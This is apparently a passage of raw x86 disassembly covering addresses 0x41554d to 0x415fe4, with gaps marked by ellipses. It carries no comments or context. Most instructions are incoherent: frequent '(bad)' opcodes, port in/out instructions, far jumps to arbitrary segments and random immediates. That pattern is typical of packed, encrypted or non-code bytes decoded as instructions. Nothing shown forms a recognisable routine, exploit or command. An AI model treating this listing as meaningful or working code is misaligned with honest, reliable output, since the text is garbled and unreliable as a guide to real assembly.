  41554d:	mov    bl,0x9c
  41554f:	fidivr DWORD PTR ds:0xa33a1533
  415555:	cli    
  415556:	xor    ebp,DWORD PTR [esi+0x79]
  415559:	icebp  
  41555a:	mov    edi,0xbc9f5654
  41555f:	ins    BYTE PTR es:[edi],dx
  415560:	and    al,0x22
  415562:	lods   eax,DWORD PTR ds:[esi]
  415563:	inc    esi
  415564:	clc    
  415565:	cli    
  415566:	mov    fs,WORD PTR [ecx+0x6]
  415569:	sti    
  41556a:	push   esi
  41556b:	mov    ah,al
	...
  4155d5:	add    ah,ah
  4155d7:	lock sub DWORD PTR [edx],ecx
  4155da:	cmp    eax,0xa2fee7db
  4155df:	arpl   WORD PTR [ebx],bp
  4155e1:	je     0x4155ef
  4155e3:	fisttp WORD PTR [ecx+0xe6588d]
  4155e9:	add    bh,bh
  4155eb:	add    BYTE PTR [eax],al
  4155ed:	add    BYTE PTR [ecx],bl
  4155ef:	xor    DWORD PTR [edi+0x59],esi
  4155f2:	fisubr DWORD PTR [ebp+ecx*1-0x4cf967db]
  4155f9:	es pop eax
  4155fb:	retf   0x7539
  4155fe:	(bad)  
  4155ff:	mov    edi,0x7e05e50c
  415604:	mov    bh,BYTE PTR [edx+0x4e613e23]
  41560a:	call   ebp
  41560c:	pop    esi
  41560d:	dec    eax
  41560e:	mov    ah,0xb1
  415610:	in     eax,dx
  415611:	sub    DWORD PTR [ebp-0x2a3fcd9],0xe0376bcb
  41561b:	int    0x50
  41561d:	pop    esp
  41561e:	jne    0x41565c
  415620:	out    0x97,al
  415622:	(bad)  
  415623:	xchg   ebx,eax
  415624:	pop    ebx
  415625:	rcl    ecx,0xea
  415628:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415629:	sbb    ebx,esi
  41562b:	jl     0x4156a3
  41562d:	iret   
  41562e:	mov    bl,0x41
  415630:	mov    ds:0xf7c335fc,eax
  415635:	out    0xee,eax
  415637:	cmp    al,0xaa
  415639:	xlat   BYTE PTR ds:[ebx]
  41563a:	mov    DWORD PTR [edi],0x7cabd382
  415640:	ret    
  415641:	dec    esp
  415642:	int    0x9c
  415644:	stc    
  415645:	push   ss
  415646:	aas    
  415647:	push   esp
  415648:	or     BYTE PTR [esi],ch
  41564a:	mov    BYTE PTR [ebx+0x4a],cl
  41564d:	cli    
  41564e:	inc    eax
  41564f:	lods   eax,DWORD PTR ds:[esi]
  415650:	push   eax
  415651:	add    eax,0x4b001acb
  415656:	int    0x6b
  415658:	inc    edi
  415659:	ins    DWORD PTR es:[edi],dx
  41565a:	jle    0x4156cd
  41565c:	or     al,0xaa
  41565e:	loop   0x4156b7
  415660:	cmc    
  415661:	fwait
  415662:	cmp    eax,0xcfb37582
  415668:	push   esp
  415669:	inc    edx
  41566a:	add    eax,0xc16ea131
  41566f:	or     DWORD PTR ds:0xda3a02b8,0x63704077
  415679:	dec    ebx
  41567a:	cmp    al,0x29
  41567c:	adc    edx,DWORD PTR [edi+0x46c35257]
  415682:	sbb    BYTE PTR [esp+eiz*8],al
  415685:	adc    edx,DWORD PTR [ebx-0x2ac868fc]
  41568b:	jno    0x4156db
  41568d:	or     ch,BYTE PTR [eax-0x2a837438]
  415693:	jne    0x4156f7
  415695:	mov    eax,0x2fc1768d
  41569a:	xchg   BYTE PTR [ebx+0x16],bl
  41569d:	jl     0x4156ae
  41569f:	out    0x5,al
  4156a1:	push   eax
  4156a2:	(bad)  
  4156a3:	(bad)  [ebx-0x62635e84]
  4156a9:	jge    0x41570f
  4156ab:	mov    ecx,0x1ac5b8d4
  4156b0:	(bad)  
  4156b1:	mov    al,0xb8
  4156b3:	inc    esp
  4156b4:	or     BYTE PTR [eax+ebx*2+0x7e],ah
  4156b8:	pusha  
  4156b9:	xor    BYTE PTR [ebx],0x55
  4156bc:	test   DWORD PTR [ebp-0x1735077b],ebx
  4156c2:	jmp    0x158a:0x4d57e1c3
  4156c9:	push   0x5862abd0
  4156ce:	mov    ebp,DWORD PTR [ebp-0x58]
  4156d1:	xor    eax,0x1fbd2809
  4156d6:	pop    ebp
  4156d7:	mov    ebp,0x7e833e0
  4156dc:	cmp    eax,0x82f6c167
  4156e1:	add    eax,DWORD PTR [bx+di+0x4f4a]
  4156e6:	retf   
  4156e7:	gs xor eax,0xf5697b69
	...
  415755:	add    BYTE PTR [ebp-0x66],ch
  415758:	mov    esp,0xfd67ff45
  41575d:	mov    edx,0x2c46bab3
  415762:	cmp    edi,DWORD PTR [edx-0xa]
  415765:	adc    al,0x57
  415767:	out    0x0,eax
  415769:	add    bh,bh
  41576b:	add    BYTE PTR [eax],al
  41576d:	add    BYTE PTR [edi+edx*2-0x17],bh
  415771:	stos   BYTE PTR es:[edi],al
  415772:	xchg   esi,eax
  415773:	mov    ah,0x65
  415775:	outs   dx,DWORD PTR ds:[esi]
  415776:	mov    al,ds:0x26a4a2b1
  41577b:	imul   ebp,esp,0x27
  41577e:	pop    edi
  41577f:	ds push edi
  415781:	or     al,0xc3
  415783:	mov    ch,0x37
  415785:	not    DWORD PTR [esi-0x36]
  415788:	jae    0x415743
  41578a:	clc    
  41578b:	not    ebp
  41578d:	or     DWORD PTR [edi],ecx
  41578f:	data16 cmp BYTE PTR [edx+esi*1],ah
  415793:	in     eax,dx
  415794:	retf   
  415795:	dec    esi
  415796:	mov    ds:0x7f4c1313,eax
  41579b:	add    eax,0x436d206d
  4157a0:	call   0x2d5f:0x37c4ade7
  4157a7:	mov    ch,0xbd
  4157a9:	mov    ah,bl
  4157ab:	sub    BYTE PTR [eax],dl
  4157ad:	or     ah,BYTE PTR [edx-0x42]
  4157b0:	jo     0x41573b
  4157b2:	cmp    eax,ecx
  4157b4:	pop    esi
  4157b5:	sbb    eax,0xf1ffd942
  4157ba:	mov    eax,0xdc66e949
  4157bf:	sbb    bl,cl
  4157c1:	push   es
  4157c2:	or     DWORD PTR [ecx+edx*2],ecx
  4157c5:	xor    DWORD PTR [edx],ecx
  4157c7:	push   ebp
  4157c8:	in     al,0x65
  4157ca:	inc    ecx
  4157cb:	shl    BYTE PTR [eax-0x5d4f4be8],cl
  4157d1:	push   esi
  4157d2:	popf   
  4157d3:	add    esi,DWORD PTR [edx]
  4157d5:	popa   
  4157d6:	cmp    BYTE PTR [edi+0x7a],0xb2
  4157da:	pushf  
  4157db:	sub    eax,DWORD PTR [edx-0x9]
  4157de:	lahf   
  4157df:	(bad)  
  4157e0:	xchg   edx,eax
  4157e1:	ins    BYTE PTR es:[edi],dx
  4157e2:	mov    edi,0x2936a450
  4157e7:	jmp    0xf9f2:0x9a17142e
  4157ee:	dec    ecx
  4157ef:	and    eax,0x795373ec
  4157f4:	std    
  4157f5:	mov    ah,BYTE PTR [eax+0x5d40bf1d]
  4157fb:	push   es
  4157fc:	cmp    DWORD PTR [edx+0x4c],ebp
  4157ff:	dec    eax
  415800:	popa   
  415801:	jp     0x41578b
  415803:	cdq    
  415804:	pop    ecx
  415805:	jbe    0x415836
  415807:	mov    edx,esi
  415809:	bound  esi,QWORD PTR ds:0x3c7d13dd
  41580f:	int3   
  415810:	push   ebp
  415811:	mov    ss,WORD PTR [ecx+0x37fb2ce8]
  415817:	cmp    eax,0xb7d5bf94
  41581c:	and    eax,0xe88e129
  415821:	ins    BYTE PTR es:[edi],dx
  415822:	jmp    0x4157a6
  415824:	and    BYTE PTR [edi+0x3d],ch
  415827:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415828:	push   edx
  415829:	cmp    BYTE PTR [ebx],cl
  41582b:	adc    esi,DWORD PTR [edx+0x5a]
  41582e:	retf   
  41582f:	push   ebp
  415830:	and    BYTE PTR [edi],dl
  415832:	data16 sub al,0xf4
  415835:	js     0x4157cd
  415837:	les    ebp,FWORD PTR [esi-0x6dd0620b]
  41583d:	xchg   edi,eax
  41583e:	sub    BYTE PTR [edx-0x368c6ed2],bl
  415844:	add    eax,0xee6dd804
  415849:	pop    ebp
  41584a:	pop    edi
  41584b:	inc    eax
  41584c:	enter  0xaac3,0x4d
  415850:	adc    eax,0x104518f6
  415855:	shl    BYTE PTR [esi],1
  415857:	and    al,0x42
  415859:	stos   BYTE PTR es:[edi],al
  41585a:	cs push 0x77b71700
  415860:	mov    esp,0xe2899df8
  415865:	retf   
  415866:	icebp  
  415867:	sbb    al,BYTE PTR [edx-0x639b3e5]
	...
  4158d5:	add    bl,cl
  4158d7:	(bad)  
  4158d8:	xchg   ebx,eax
  4158d9:	in     al,dx
  4158da:	mov    bh,0xed
  4158dc:	(bad)  
  4158dd:	inc    DWORD PTR [edi]
  4158df:	(bad)  
  4158e1:	shr    DWORD PTR [edi],cl
  4158e3:	xlat   BYTE PTR ds:[ebx]
  4158e4:	in     eax,dx
  4158e5:	repz push esi
  4158e7:	call   0x14058ec
  4158ec:	add    BYTE PTR [eax],al
  4158ee:	stos   BYTE PTR es:[edi],al
  4158ef:	inc    eax
  4158f0:	dec    BYTE PTR [ebx-0x97691c2]
  4158f6:	cmp    eax,0xbf228208
  4158fb:	jecxz  0x41588c
  4158fd:	sub    ebx,ecx
  4158ff:	add    ch,BYTE PTR [ebx-0x3f]
  415902:	add    esp,DWORD PTR [ebp+0x68]
  415905:	ficom  WORD PTR [edx+0x6bf0280f]
  41590b:	and    al,0xf9
  41590d:	arpl   WORD PTR [eax+ecx*2+0x19],di
  415911:	aas    
  415912:	jae    0x41593e
  415914:	mov    ebp,0xd883cc41
  415919:	fldenv [eax+0x103e6827]
  41591f:	jg     0x4158ca
  415921:	dec    edx
  415922:	mov    cl,0x24
  415924:	not    DWORD PTR [ebx+0x59]
  415927:	les    esi,FWORD PTR [ebx+0x7ff4f87d]
  41592d:	das    
  41592e:	test   eax,0x52d0d8
  415933:	fistp  DWORD PTR [eax+0xc]
  415936:	adc    ebp,DWORD PTR [ecx+edi*4-0x5f]
  41593a:	and    bh,BYTE PTR [ebp-0x79dd96a4]
  415940:	cmp    esp,DWORD PTR ds:0xcff275a5
  415946:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415947:	and    BYTE PTR [edi],ah
  415949:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41594a:	xchg   BYTE PTR [edx-0x3e],al
  41594d:	push   ecx
  41594e:	push   ds
  41594f:	out    0xfc,al
  415951:	aam    0x30
  415953:	push   ebx
  415954:	mov    eax,0x19009a75
  415959:	mov    al,ds:0x6b38d6e7
  41595e:	imul   edi,edi,0x598224f2
  415964:	xchg   esi,eax
  415965:	cmp    DWORD PTR [ebp+0x7f4288ba],ebx
  41596b:	rcl    DWORD PTR [eax-0x45],1
  41596e:	call   FWORD PTR [esi]
  415970:	push   ecx
  415971:	dec    esp
  415972:	pop    ds
  415973:	add    al,0x14
  415975:	andps  xmm7,XMMWORD PTR [ebx-0xd0a64e5]
  41597c:	jle    0x4159c9
  41597e:	cmp    bl,dl
  415980:	inc    ebp
  415981:	out    dx,al
  415982:	push   0x5d
  415984:	lock inc BYTE PTR [esi*4-0x49cd4df9]
  41598c:	push   ecx
  41598d:	xor    edi,DWORD PTR ds:0x4f3c9985
  415993:	pop    ebp
  415994:	jnp    0x415917
  415996:	clc    
  415997:	jno    0x415997
  415999:	fucom  st(3)
  41599b:	in     eax,0xf3
  41599d:	test   eax,0x802a20df
  4159a2:	es sti 
  4159a4:	push   esi
  4159a5:	(bad)  
  4159a6:	cli    
  4159a7:	scas   al,BYTE PTR es:[edi]
  4159a8:	cwde   
  4159a9:	adc    al,0xf2
  4159ab:	fisubr DWORD PTR [ebx-0x5273f5c9]
  4159b1:	unpcklps xmm3,XMMWORD PTR [esi-0x7b]
  4159b5:	push   eax
  4159b6:	retf   
  4159b7:	push   edx
  4159b8:	xor    DWORD PTR [ebx],ecx
  4159ba:	mov    cl,0x4d
  4159bc:	(bad)  
  4159bd:	sbb    ah,ah
  4159bf:	jae    0x41594b
  4159c1:	xchg   esi,eax
  4159c2:	inc    ebx
  4159c3:	push   ebp
  4159c4:	test   al,0xd9
  4159c6:	gs push ebx
  4159c8:	fbld   TBYTE PTR [ecx*8+0x388c2e1c]
  4159cf:	inc    eax
  4159d0:	jg     0x4159cf
  4159d2:	test   eax,0xb686f205
  4159d7:	div    DWORD PTR [ecx-0x7292b7ca]
  4159dd:	jno    0x41598c
  4159df:	test   BYTE PTR [esi+0x16],al
  4159e2:	inc    eax
  4159e3:	out    0x76,eax
  4159e5:	daa    
  4159e6:	clc    
  4159e7:	jo     0x415a45
  4159e9:	ret    
  4159ea:	ficom  DWORD PTR [edx+0x45]
	...
  415a55:	add    BYTE PTR [ebp-0x78],al
  415a58:	sub    al,0x77
  415a5a:	in     eax,dx
  415a5b:	neg    DWORD PTR [edi-0x46]
  415a5e:	sub    edi,DWORD PTR [edi-0x10]
  415a61:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415a62:	loope  0x415a14
  415a64:	inc    ecx
  415a65:	xor    eax,0xe955
  415a6a:	inc    DWORD PTR [eax]
  415a6c:	add    BYTE PTR [eax],al
  415a6e:	pushf  
  415a6f:	push   0x35
  415a71:	xchg   esi,eax
  415a73:	rol    DWORD PTR [eax],0x6e
  415a76:	push   0x34
  415a78:	fisubr DWORD PTR [ebp-0x1d25ec29]
  415a7e:	pushf  
  415a7f:	arpl   ax,ax
  415a81:	fstp   TBYTE PTR [ebp+0x6a]
  415a84:	dec    edx
  415a85:	in     eax,0x75
  415a87:	mov    eax,0xa510960b
  415a8c:	xor    DWORD PTR [eax-0x40bcc725],esi
  415a92:	nop
  415a93:	and    eax,0x36451279
  415a98:	pop    eax
  415a99:	mov    ecx,0xd8399408
  415a9e:	jle    0x415a54
  415aa0:	shl    esp,1
  415aa2:	clc    
  415aa3:	out    dx,eax
  415aa4:	mov    cl,cl
  415aa6:	mov    al,BYTE PTR [ecx]
  415aa8:	enter  0x8ff3,0xc9
  415aac:	lods   eax,DWORD PTR ds:[esi]
  415aad:	int    0x92
  415aaf:	cmp    dl,dh
  415ab1:	gs in  al,0xae
  415ab4:	ja     0x415a98
  415ab6:	sbb    eax,0x5fd47af1
  415abb:	jb     0x415a61
  415abd:	js     0x415af1
  415abf:	aaa    
  415ac0:	(bad)  
  415ac1:	imul   eax,DWORD PTR [ecx+0x90e1d6d],0xffffffa4
  415ac8:	stc    
  415ac9:	hlt    
  415aca:	jb     0x415a64
  415acc:	or     ecx,ecx
  415ace:	and    BYTE PTR [edx],0x53
  415ad1:	or     ebx,DWORD PTR [ecx-0x5cf0fc5b]
  415ad7:	fnsave [ecx+0x2b]
  415ada:	mul    BYTE PTR [edx]
  415adc:	out    0x3e,eax
  415ade:	ror    bh,cl
  415ae0:	xor    al,0xaf
  415ae2:	mov    ebx,0x72ea6559
  415ae7:	dec    edi
  415ae8:	or     al,0xd1
  415aea:	(bad)  
  415aeb:	std    
  415aec:	cli    
  415aed:	jge    0x415af2
  415aef:	mov    bl,BYTE PTR [eax-0x66]
  415af2:	scas   al,BYTE PTR es:[edi]
  415af3:	sub    eax,0xca68a684
  415af8:	mov    dh,0x4
  415afa:	imul   esp,ebp,0xf511835a
  415b00:	repz test BYTE PTR [eax+0x3c04aa60],ah
  415b07:	das    
  415b08:	mov    DWORD PTR [esi-0xd82446e],edx
  415b0e:	pop    eax
  415b0f:	mov    ds,edi
  415b11:	mov    cl,BYTE PTR [eax+0x2630b73e]
  415b17:	mov    edx,0xb5915056
  415b1c:	ficomp DWORD PTR [eax+ecx*2+0x4e7a701]
  415b23:	push   0x8
  415b25:	dec    esp
  415b26:	jnp    0x415b9d
  415b28:	in     eax,dx
  415b29:	lods   eax,DWORD PTR ds:[esi]
  415b2a:	ds xchg edx,eax
  415b2c:	xchg   ebx,eax
  415b2d:	and    ebp,0xeab29867
  415b33:	dec    esp
  415b34:	mov    esi,0x6b03e7a0
  415b39:	xor    edx,DWORD PTR [ebx]
  415b3b:	sbb    DWORD PTR [ebx-0x60dd35b7],edi
  415b41:	gs sub ebx,ebp
  415b44:	or     esp,DWORD PTR [edx-0x5b]
  415b47:	mov    ch,0xc3
  415b49:	jae    0x415b7a
  415b4b:	push   ebp
  415b4c:	sbb    BYTE PTR [ebp-0x73],bh
  415b4f:	jno    0x415b47
  415b51:	xlat   BYTE PTR ds:[ebx]
  415b52:	popa   
  415b53:	je     0x415b83
  415b55:	or     BYTE PTR [eax+eax*1-0x1d],ch
  415b59:	jno    0x415b68
  415b5b:	mov    ah,0x7e
  415b5d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415b5e:	push   es
  415b5f:	stc    
  415b60:	xor    BYTE PTR [edx-0x67bf400a],cl
  415b66:	fisubr WORD PTR [ebp+0x26511549]
  415b6c:	in     al,dx
	...
  415bd5:	add    bh,bl
  415bd7:	mov    esi,0xbb659205
  415bdc:	(bad)  
  415bde:	stc    
  415bdf:	dec    ebp
  415be0:	push   ss
  415be1:	fcomp  QWORD PTR [eax]
  415be3:	pushf  
  415be4:	pop    esi
  415be5:	rcl    DWORD PTR [edx+ebp*8+0x0],0x0
  415bea:	inc    DWORD PTR [eax]
  415bec:	add    BYTE PTR [eax],al
  415bee:	push   ss
  415bef:	sub    al,0x5e
  415bf1:	fadd   DWORD PTR [edx]
  415bf3:	ret    0x90e
  415bf6:	cmp    esi,DWORD PTR [esi+0x15]
  415bf9:	or     al,0x55
  415bfb:	out    dx,al
  415bfc:	fld    DWORD PTR [edi]
  415bfe:	gs xor al,0x66
  415c01:	out    0x19,eax
  415c03:	mov    cl,0x51
  415c05:	push   ebp
  415c06:	shl    ch,1
  415c08:	xor    DWORD PTR [edi+0x66],0xbe84734f
  415c0f:	mov    ds:0x32df7b42,eax
  415c14:	outs   dx,BYTE PTR ds:[esi]
  415c15:	or     eax,0x9a7be61c
  415c1a:	sub    ecx,DWORD PTR [ebp+0x14d6848]
  415c20:	inc    edx
  415c21:	add    DWORD PTR [ebx-0x77],edx
  415c24:	inc    edx
  415c25:	popf   
  415c26:	adc    DWORD PTR [edi],ecx
  415c28:	int3   
  415c29:	cs popf 
  415c2b:	daa    
  415c2c:	jle    0x415c86
  415c2e:	pop    esp
  415c2f:	xchg   ebp,eax
  415c30:	iret   
  415c31:	jmp    DWORD PTR [ebx-0x7b]
  415c34:	sbb    DWORD PTR [esi],esi
  415c36:	(bad)  
  415c37:	jge    0x415cac
  415c39:	gs sbb eax,0x1277a98a
  415c3f:	add    DWORD PTR [edx],ebp
  415c41:	ins    BYTE PTR es:[edi],dx
  415c42:	xor    al,0x9f
  415c44:	pop    esi
  415c45:	ret    0x584c
  415c48:	inc    edx
  415c49:	xor    eax,0x8a43b859
  415c4e:	shr    BYTE PTR [ebx-0x28711a3a],1
  415c54:	jnp    0x415cd5
  415c56:	push   edi
  415c57:	in     al,dx
  415c58:	and    BYTE PTR [ebp-0x5ab35c62],ch
  415c5e:	or     bh,BYTE PTR [ebx]
  415c60:	mov    bh,0x44
  415c62:	mov    BYTE PTR [ebx+edx*8+0x49],cl
  415c66:	xor    BYTE PTR [ecx],bh
  415c68:	mov    esp,0x62ba3e7c
  415c6d:	adc    eax,0x73ce70c3
  415c72:	add    al,0x51
  415c74:	das    
  415c75:	push   es
  415c76:	dec    bx
  415c78:	mov    ebp,0x32b40124
  415c7d:	inc    ebp
  415c7e:	add    DWORD PTR [eax-0x7461810a],edx
  415c84:	sub    BYTE PTR [ebx-0x6d2eb14e],bl
  415c8a:	xchg   ebx,eax
  415c8b:	or     eax,0xd2198377
  415c90:	pusha  
  415c91:	dec    esp
  415c92:	ret    0x9f3b
  415c95:	pop    ds
  415c96:	stc    
  415c97:	(bad)  
  415c98:	adc    DWORD PTR [edi],ebx
  415c9a:	test   eax,0xa492e5d7
  415c9f:	ins    BYTE PTR es:[edi],dx
  415ca0:	xchg   edi,eax
  415ca1:	jne    0x415caa
  415ca3:	retf   
  415ca4:	xchg   ebx,eax
  415ca5:	jmp    0x415c38
  415ca7:	ret    0xbe6b
  415caa:	rcl    esp,0x2
  415cad:	int    0x88
  415caf:	push   0x51fe72b9
  415cb4:	mov    al,ds:0xaaf2579f
  415cb9:	call   0x639c:0x6afe5b5
  415cc0:	adc    DWORD PTR ds:0x17896abc,ebx
  415cc6:	mov    bl,ah
  415cc8:	ins    DWORD PTR es:[edi],dx
  415cc9:	push   es
  415cca:	or     DWORD PTR [ebx+0x6e1f48e8],esi
  415cd0:	xor    BYTE PTR [esi+0x77f68474],ch
  415cd6:	jp     0x415d40
  415cd8:	arpl   WORD PTR [ecx+0x3e175099],bx
  415cde:	(bad)  
  415cdf:	call   0x1e9584b1
  415ce4:	jmp    0xe0487558
  415ce9:	jnp    0x415ced
  415ceb:	xor    al,0xd1
	...
  415d55:	add    BYTE PTR [edx],bh
  415d57:	adc    BYTE PTR [edi-0x444040c4],bh
  415d5d:	push   ss
  415d5e:	push   esp
  415d5f:	push   ecx
  415d60:	mov    esi,0x9cf8661f
  415d65:	in     al,dx
  415d66:	push   ebx
  415d67:	jmp    0x415d69
  415d69:	add    bh,bh
  415d6b:	add    BYTE PTR [eax],al
  415d6d:	add    dl,bl
  415d6f:	mov    esi,0x25dc4313
  415d74:	xchg   ebx,eax
  415d75:	dec    ecx
  415d76:	pop    ss
  415d77:	cld    
  415d78:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415d79:	pop    ax
  415d7b:	jmp    0x34b45f46
  415d80:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415d81:	les    edx,FWORD PTR [ebx+ebx*1-0x5d]
  415d85:	jl     0x415d1a
  415d87:	fwait
  415d88:	mov    esi,es
  415d8a:	(bad)  
  415d8b:	sub    al,0xeb
  415d8d:	pushf  
  415d8e:	arpl   WORD PTR [eax+0x50980d92],ax
  415d94:	xchg   esi,eax
  415d95:	sbb    ecx,ebx
  415d97:	repz icebp 
  415d99:	pop    eax
  415d9a:	dec    ebx
  415d9b:	push   ebx
  415d9c:	mov    al,ds:0x9b7b170d
  415da1:	push   gs
  415da3:	cdq    
  415da4:	pop    edi
  415da5:	push   edi
  415da6:	or     esp,DWORD PTR [ebp+0x58dfcc90]
  415dac:	out    0x5f,al
  415dae:	retf   
  415daf:	cdq    
  415db0:	mov    ?,esp
  415db2:	inc    ebp
  415db3:	and    BYTE PTR [edx],ah
  415db5:	jl     0x415e35
  415db7:	leave  
  415db8:	jno    0x415dba
  415dba:	fiadd  WORD PTR [esi+0x7e29c31b]
  415dc0:	scas   al,BYTE PTR es:[edi]
  415dc1:	jle    0x415d54
  415dc3:	mov    dl,0x60
  415dc5:	mov    bh,0x90
  415dc8:	xlat   BYTE PTR ds:[ebx]
  415dc9:	ror    ebp,0x6a
  415dcc:	fnstenv [edx-0xef702db]
  415dd2:	dec    ecx
  415dd3:	push   eax
  415dd4:	loop   0x415ddc
  415dd6:	dec    edx
  415dd7:	jo     0x415d97
  415dd9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415dda:	cmp    eax,0x68fd27cf
  415ddf:	dec    eax
  415de0:	dec    edi
  415de1:	aad    0xc7
  415de3:	lahf   
  415de4:	pop    ds
  415de5:	or     DWORD PTR [eax-0x30],esp
  415de8:	inc    edx
  415de9:	xchg   esi,eax
  415dea:	mov    eax,ds:0x4093ee68
  415def:	cmp    DWORD PTR ds:0x213813a9,ecx
  415df5:	xor    edi,DWORD PTR [eax+0x65]
  415df8:	pop    edi
  415df9:	adc    bl,bh
  415dfb:	popa   
  415dfc:	lods   al,BYTE PTR ds:[esi]
  415dfd:	es jecxz 0x415dac
  415e00:	or     al,ch
  415e02:	xlat   BYTE PTR ds:[ebx]
  415e03:	xchg   BYTE PTR [edx-0x6f],dl
  415e06:	adc    BYTE PTR [eax-0x34],0x2
  415e0a:	(bad)  
  415e0b:	ror    ebp,1
  415e0d:	fstp   QWORD PTR [eax]
  415e0f:	mov    DWORD PTR [ebx-0x4c6fd192],esp
  415e15:	inc    ebp
  415e16:	repnz pop edx
  415e18:	mov    ebx,0xdb1bf638
  415e1d:	mov    al,ds:0x32e6fe62
  415e22:	js     0x415e07
  415e24:	mov    WORD PTR [ebp-0x2d2815e9],?
  415e2a:	pop    ebp
  415e2b:	xlat   BYTE PTR ds:[ebx]
  415e2c:	stos   DWORD PTR es:[edi],eax
  415e2d:	rcr    BYTE PTR [ebx+0x6d],1
  415e30:	ins    BYTE PTR es:[edi],dx
  415e31:	out    dx,al
  415e32:	adc    ebx,DWORD PTR [ebx]
  415e34:	push   esp
  415e35:	xor    DWORD PTR [esi+eiz*8-0x785c4981],eax
  415e3c:	adc    edi,esi
  415e3e:	fwait
  415e3f:	push   edi
  415e40:	mov    eax,0x536f49fe
  415e45:	fwait
  415e46:	xchg   edx,eax
  415e47:	and    edi,edi
  415e49:	inc    edi
  415e4a:	add    ebp,DWORD PTR [ebx]
  415e4c:	mov    eax,0xb570f84
  415e51:	outs   dx,DWORD PTR ds:[esi]
  415e52:	call   0x61e89e86
  415e57:	into   
  415e58:	dec    esi
  415e59:	sti    
  415e5a:	sti    
  415e5b:	jb     0x415e44
  415e5d:	(bad)  
  415e5e:	aas    
  415e5f:	dec    eax
  415e60:	xchg   edx,eax
  415e61:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415e62:	or     al,0x16
  415e64:	xor    DWORD PTR [ebx+0x37],ebx
  415e67:	jno    0x415dec
  415e69:	push   es
  415e6a:	sbb    BYTE PTR [ecx-0x3a],ah
	...
  415ed5:	add    dh,ch
  415ed7:	repnz cmc 
  415ed9:	add    edi,ebp
  415edb:	pop    es
  415edc:	(bad)  
  415edd:	call   FWORD PTR [ebp+0x1f]
  415ee0:	les    esi,FWORD PTR [eax+0x79]
  415ee3:	push   ebp
  415ee4:	lods   al,BYTE PTR ds:[esi]
  415ee5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415ee6:	push   edx
  415ee7:	in     al,dx
  415ee8:	add    BYTE PTR [eax],al
  415eea:	inc    DWORD PTR [eax]
  415eec:	add    BYTE PTR [eax],al
  415eee:	pop    ebx
  415eef:	pop    edi
  415ef0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415ef1:	dec    ebx
  415ef2:	dec    eax
  415ef3:	jg     0x415e7c
  415ef5:	pop    edi
  415ef6:	mov    dh,0x6e
  415ef8:	fadd   QWORD PTR [edx-0x35742366]
  415efe:	push   cs
  415eff:	dec    ebp
  415f00:	inc    edx
  415f01:	aam    0xe0
  415f03:	inc    ecx
  415f04:	cmp    BYTE PTR [esi-0x71fa79ac],cl
  415f0a:	lods   eax,DWORD PTR ds:[esi]
  415f0b:	xchg   ebp,eax
  415f0c:	(bad)  
  415f0d:	imul   ebp,ebp,0x0
  415f10:	cmovg  ebp,DWORD PTR [eax]
  415f13:	cdq    
  415f14:	dec    esi
  415f15:	jo     0x415ef0
  415f17:	xchg   ecx,eax
  415f18:	ficomp DWORD PTR [ebx+eiz*4-0x60]
  415f1c:	sar    bl,cl
  415f1e:	push   ebp
  415f1f:	jbe    0x415f9a
  415f21:	popf   
  415f22:	add    al,BYTE PTR [eax+0x2b]
  415f25:	push   0x4597bca0
  415f2a:	or     eax,0x7d8fc849
  415f2f:	xor    BYTE PTR [edx+0x29599f4c],bh
  415f35:	jmp    DWORD PTR [edi+edx*4]
  415f38:	mov    BYTE PTR [ecx+0x2d729922],al
  415f3e:	xchg   BYTE PTR [ebx-0x626fdd7d],dh
  415f44:	mov    dh,BYTE PTR [esi+ebx*8+0x57f9e423]
  415f4b:	xor    BYTE PTR [edi+eax*2-0x322ac135],ah
  415f52:	mov    edx,0x370aaf94
  415f57:	ficomp WORD PTR [ecx-0x7d]
  415f5a:	mov    ds:0x68ebb50f,eax
  415f5f:	sbb    eax,0x227a6fe
  415f64:	clc    
  415f65:	dec    ecx
  415f66:	retf   
  415f67:	mov    ebx,0x45e88ee5
  415f6c:	jmp    0xe8124a40
  415f71:	leave  
  415f72:	pop    ds
  415f73:	jge    0x415f8b
  415f75:	fwait
  415f76:	xor    ecx,0xffffff88
  415f79:	ins    BYTE PTR es:[edi],dx
  415f7a:	pop    ebp
  415f7b:	mov    ebx,DWORD PTR [esi]
  415f7d:	dec    eax
  415f7e:	mov    esi,0x811c2ff0
  415f83:	mov    edi,0x145f83f1
  415f88:	pop    es
  415f89:	dec    ebx
  415f8a:	cdq    
  415f8b:	xchg   esi,eax
  415f8c:	mov    ebx,0xf95b1241
  415f91:	arpl   WORD PTR [edi+0x11],cx
  415f94:	gs sahf 
  415f96:	xor    eax,DWORD PTR [ebp+0x3773c2b3]
  415f9c:	sub    al,0x28
  415f9e:	xchg   BYTE PTR [eax-0x75],dh
  415fa1:	and    BYTE PTR [eax+0x47],ch
  415fa4:	clc    
  415fa5:	cdq    
  415fa6:	xor    bh,BYTE PTR [eax+edx*4+0x73]
  415faa:	mov    esi,0x9d6d471c
  415faf:	leave  
  415fb0:	loope  0x415f3a
  415fb2:	cwde   
  415fb3:	call   0x4246:0x53b3
  415fb9:	test   DWORD PTR [edx-0x73],ebx
  415fbc:	not    BYTE PTR [eax-0x497afdc8]
  415fc2:	push   es
  415fc3:	sub    dl,0xa3
  415fc6:	clc    
  415fc7:	mov    edx,0x77ae958f
  415fcc:	adc    ebp,eax
  415fce:	js     0x415fb1
  415fd0:	lods   al,BYTE PTR ds:[esi]
  415fd1:	pop    ss
  415fd2:	push   ss
  415fd3:	and    dl,BYTE PTR [ecx+ebp*1]
  415fd6:	push   0x7dd231b1
  415fdb:	inc    BYTE PTR [esi]
  415fdd:	sbb    ebx,eax
  415fdf:	cwde   
  415fe0:	outs   dx,BYTE PTR ds:[esi]
  415fe1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415fe2:	mov    dh,0x85
  415fe4:	pop    edx
